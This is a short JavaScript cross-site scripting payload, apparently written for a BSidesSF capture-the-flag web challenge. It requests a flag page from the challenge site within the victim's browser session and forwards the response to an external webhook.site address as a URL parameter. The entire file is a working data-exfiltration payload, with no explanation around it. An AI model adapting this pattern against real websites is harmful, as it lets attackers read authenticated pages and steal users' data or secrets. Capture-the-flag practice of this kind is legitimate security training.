var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', true);
xhr.send(); 
xhr.onreadystatechange = function() {
        var flag = xhr.responseText; 
        var exfiltration = new XMLHttpRequest();
        var tmp = 'https://webhook.site/6b738c6b-fd1f-49fe-8068-a2913f2c22ee/?flag=' + encodeURIComponent(flag);
        exfiltration.open('GET', tmp, true);
        exfiltration.send(); 
    
};
